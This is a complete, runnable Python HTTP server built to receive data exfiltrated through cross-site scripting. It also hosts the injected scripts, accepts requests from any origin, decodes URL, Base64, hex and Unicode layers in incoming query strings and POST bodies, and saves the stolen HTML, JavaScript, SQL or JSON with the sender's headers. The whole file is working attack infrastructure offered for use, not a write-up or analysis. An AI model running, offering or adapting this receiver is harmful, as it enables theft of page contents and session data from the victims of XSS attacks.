#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import base64
import re
import sys
import os
import argparse
import threading
import json
import logging
import hashlib
from datetime import datetime, timezone

# --- Argument Parsing ---
parser = argparse.ArgumentParser(description='Decode server for URL/Base64 exfiltration')
parser.add_argument('--port', '-p', type=int, default=80, help='Port to listen on (default: 80)')
parser.add_argument('--show', '-s', action='store_true', help='Print decoded content to console')
parser.add_argument('--json-log', action='store_true', help='Enable JSON log output')
parser.add_argument('--allow-ip', nargs='*', help='List of allowed IP addresses')
parser.add_argument('--anonymize', '-a', action='store_true', help='Anonymize IP addresses in logs')
parser.add_argument('--max-depth', type=int, default=5, help='Maximum recursive decoding depth (default: 5)')
parser.add_argument('--min-length', type=int, default=8, help='Minimum payload length to process (default: 8)')
parser.add_argument('--output-dir', default='decoded_html', help='Output directory (default: decoded_html)')
parser.add_argument('--quiet', '-q', action='store_true', help='Minimize console output')
args = parser.parse_args()

# --- Configuration ---
PORT = args.port
SHOW_HTML = args.show
JSON_LOG = args.json_log
ALLOWED_IPS = set(args.allow_ip) if args.allow_ip else None
ANONYMIZE = args.anonymize
MAX_DEPTH = args.max_depth
MIN_LENGTH = args.min_length
SAVE_DIR = args.output_dir
QUIET = args.quiet

BASE_DIR = os.path.abspath(os.path.dirname(__file__))
SAVE_PATH = os.path.join(BASE_DIR, SAVE_DIR)
LOG_FILE = os.path.join(SAVE_PATH, 'log.jsonl') if JSON_LOG else None

# --- Setup ---
os.makedirs(SAVE_PATH, exist_ok=True)
lock = threading.Lock()

# Setup logging
if QUIET:
    logging.basicConfig(level=logging.WARNING, format='[%(levelname)s] %(message)s')
else:
    logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
log = logging.getLogger("xssrecv")

print(f"Working dir: {BASE_DIR}")
print(f"Saving decoded content to: {SAVE_PATH}")
print(f"Listening on port: {PORT}, show mode: {SHOW_HTML}, json log: {JSON_LOG}")
if ANONYMIZE:
    print("IP anonymization: enabled")

# Allow immediate socket reuse
socketserver.TCPServer.allow_reuse_address = True
socketserver.ThreadingTCPServer.allow_reuse_address = True

# --- Helpers ---
def anonymize_ip(ip):
    """Hash IP for anonymization"""
    if not ANONYMIZE:
        return ip
    return hashlib.sha256(ip.encode()).hexdigest()[:12]

def fix_padding(b64_string):
    """Fix Base64 padding"""
    missing = len(b64_string) % 4
    if missing:
        b64_string += '=' * (4 - missing)
    return b64_string

def try_base64_decode(s: str):
    """Try to decode Base64"""
    try:
        decoded = base64.b64decode(fix_padding(s))
        return decoded.decode('utf-8', errors='replace')
    except Exception:
        return None

def try_hex_decode(s: str):
    """Try to decode hex"""
    try:
        # Remove common prefixes and clean
        cleaned = re.sub(r'^(0x|\\x)', '', s, flags=re.IGNORECASE)
        cleaned = re.sub(r'[^0-9a-fA-F]', '', cleaned)
        if len(cleaned) % 2 != 0 or len(cleaned) < 4:
            return None
        decoded = bytes.fromhex(cleaned)
        return decoded.decode('utf-8', errors='replace')
    except Exception:
        return None

def try_unicode_decode(s: str):
    """Try to decode Unicode escapes"""
    try:
        # Handle various Unicode escape formats
        if '\\u' in s or '\\x' in s or '%u' in s:
            result = s
            # Unicode \u0041 format
            result = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), result)
            # Hex \x41 format  
            result = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), result)
            # URL Unicode %u0041 format
            result = re.sub(r'%u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), result)
            if result != s:
                return result
        return None
    except Exception:
        return None

def recursive_decode(data: str):
    """
    Recursively decode URL-encoding, Base64, hex, and Unicode layers up to MAX_DEPTH.
    Returns final data and list of (layer_type, snippet).
    """
    layers = []
    current = data
    
    for _ in range(MAX_DEPTH):
        original = current
        
        # Try URL decoding first
        url_decoded = urllib.parse.unquote(current)
        if url_decoded != current:
            layers.append(('url', url_decoded[:60]))
            current = url_decoded
            continue
        
        # Try Base64 decoding (your original pattern)
        candidate = re.sub(r"\s+", "", current)
        if re.fullmatch(r'[A-Za-z0-9+/]{8,}={0,2}', candidate):
            b64_decoded = try_base64_decode(candidate)
            if b64_decoded is not None:
                layers.append(('b64', b64_decoded[:60]))
                current = b64_decoded
                continue
        
        # Try hex decoding
        hex_decoded = try_hex_decode(current)
        if hex_decoded and hex_decoded != current:
            layers.append(('hex', hex_decoded[:60]))
            current = hex_decoded
            continue
            
        # Try Unicode decoding
        unicode_decoded = try_unicode_decode(current)
        if unicode_decoded and unicode_decoded != current:
            layers.append(('unicode', unicode_decoded[:60]))
            current = unicode_decoded
            continue
        
        # No more decoding possible
        break
    
    return current, layers

def detect_content_type(content: str):
    """Detect content type"""
    content_lower = content.lower().strip()
    
    if '<html' in content_lower or '<!doctype' in content_lower:
        return 'html'
    elif content_lower.startswith('<?xml'):
        return 'xml'  
    elif any(keyword in content for keyword in ['function', 'var ', 'let ', 'const ', 'document.']):
        return 'javascript'
    elif any(keyword in content_lower for keyword in ['select ', 'insert ', 'update ', 'delete ', 'union ']):
        return 'sql'
    else:
        try:
            json.loads(content)
            return 'json'
        except:
            return 'text'

def save_html(content: str, timestamp: str):
    """Save HTML content (original function)"""
    filename = os.path.join(SAVE_PATH, f'decoded_{timestamp}.html')
    try:
        with lock, open(filename, 'w', encoding='utf-8') as f:
            f.write(content)
        log.info(f"[+] Saved HTML: {filename}")
        return filename
    except Exception as e:
        log.warning(f"[!] Error saving HTML: {e}")
        return None

def save_content(content: str, content_type: str, timestamp: str):
    """Save content by type"""
    extensions = {'xml': '.xml', 'javascript': '.js', 'sql': '.sql', 'json': '.json', 'text': '.txt'}
    ext = extensions.get(content_type, '.txt')
    filename = os.path.join(SAVE_PATH, f'decoded_{timestamp}_{content_type}{ext}')
    try:
        with lock, open(filename, 'w', encoding='utf-8') as f:
            f.write(content)
        log.info(f"[+] Saved {content_type.upper()}: {filename}")
        return filename
    except Exception as e:
        log.warning(f"[!] Error saving {content_type}: {e}")
        return None

def save_raw(raw_data: str, timestamp: str):
    """Save raw data (original function)"""
    try:
        with lock, open(os.path.join(SAVE_PATH, f'raw_{timestamp}.txt'), 'w') as f:
            f.write(raw_data)
    except Exception as e:
        log.warning(f"Could not save raw data: {e}")

def save_json_log(entry: dict):
    """Save JSON log (original function)"""
    if not JSON_LOG:
        return
    try:
        with lock, open(LOG_FILE, 'a', encoding='utf-8') as f:
            json.dump(entry, f)
            f.write('\n')
    except Exception as e:
        log.warning(f"Could not write to JSON log: {e}")

# --- Handler ---
class DecodeHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        log.info("%s - - [%s] %s", anonymize_ip(self.client_address[0]), self.log_date_time_string(), fmt % args)

    def verify_request(self, request, client_address):
        return client_address[0] in ALLOWED_IPS if ALLOWED_IPS else True

    def end_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        super().end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.end_headers()

    def handle_data(self, raw_data: str):
        """Handle data processing (enhanced from original)"""
        # Skip if too short
        if len(raw_data.strip()) < MIN_LENGTH:
            if not QUIET:
                log.info(f"[!] Payload too short ({len(raw_data)} < {MIN_LENGTH}), skipping")
            return
            
        timestamp = datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')
        key, sep, val = raw_data.partition('=')
        if not sep:
            log.warning(f"[!] Bad format: {raw_data}")
            return

        val = urllib.parse.unquote(val)
        log.info(f"[+] Raw ({key}): {val[:60]}{'...' if len(val)>60 else ''}")
        
        final, layers = recursive_decode(val)
        for i, (lt, snippet) in enumerate(layers, 1):
            log.info(f"    Layer {i} ({lt}): {snippet[:60]}{'...' if len(snippet)>60 else ''}")
        log.info(f"[+] Final length: {len(final)} chars")
        log.info(f"    Final preview: {final[:20]!r}")

        # Detect content type
        content_type = detect_content_type(final)
        log.info(f"[+] Content type: {content_type}")

        # Create metadata entry
        entry = {
            "timestamp": timestamp,
            "ip": anonymize_ip(self.client_address[0]),
            "headers": {
                "User-Agent": self.headers.get("User-Agent"),
                "Referer": self.headers.get("Referer")
            },
            "raw": raw_data[:120],
            "decoded_layers": layers,
            "final_preview": final[:120],
            "content_type": content_type
        }

        save_raw(raw_data, timestamp)

        # Save content (enhanced logic)
        saved_file = None
        if content_type == 'html' or '<html' in final.lower() or '<!doctype' in final.lower():
            # Use original HTML saving
            saved_file = save_html(final, timestamp)
            entry["saved_html"] = saved_file
            if SHOW_HTML:
                print("--- BEGIN DECODED HTML ---")
                print(final)
                print("--- END DECODED HTML ---")
        elif len(final) >= MIN_LENGTH and content_type in ['xml', 'javascript', 'sql', 'json']:
            # Save other content types
            saved_file = save_content(final, content_type, timestamp)
            entry[f"saved_{content_type}"] = saved_file
            if SHOW_HTML:  # Reuse same flag for consistency
                print(f"--- BEGIN DECODED {content_type.upper()} ---")
                print(final)
                print(f"--- END DECODED {content_type.upper()} ---")
        else:
            log.info(f"[!] Not saving {content_type} content.")
            
        save_json_log(entry)

    def do_POST(self):
        """POST handler (original with small improvements)"""
        log.info(f"🔍 POST {self.path}")
        try:
            length = int(self.headers.get('Content-Length', 0))
            if length > 2 * 1024 * 1024:  # 2MB limit
                self.send_error(413, "Payload too large")
                return
            body = self.rfile.read(length).decode('utf-8', errors='replace')
            log.info(f"    Body: {body[:100]}{'...' if len(body)>100 else ''}")
            self.handle_data(body)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Success')
        except Exception as e:
            log.error(f"[!] POST error: {e}")
            self.send_error(500, "Internal server error")

    def do_GET(self):
        """GET handler (EXACT original logic preserved)"""
        parsed = urllib.parse.urlsplit(self.path)
        filepath = parsed.path.lstrip('/')
        
        # FIRST: Serve actual files if they exist (CRITICAL for XSS)
        if filepath and os.path.isfile(os.path.join(BASE_DIR, filepath)):
            return super().do_GET()
        
        # SECOND: Log and process
        log.info(f"🔍 GET {self.path}")
        if parsed.query:
            self.handle_data(parsed.query)
        
        # THIRD: Return success
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Success')

    def do_HEAD(self):
        return self.do_GET()

# --- Main ---
if __name__ == '__main__':
    server = socketserver.ThreadingTCPServer(('0.0.0.0', PORT), DecodeHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log.info("KeyboardInterrupt received, shutting down server...")
    finally:
        server.shutdown()
        server.server_close()
        log.info("Server has exited cleanly.")
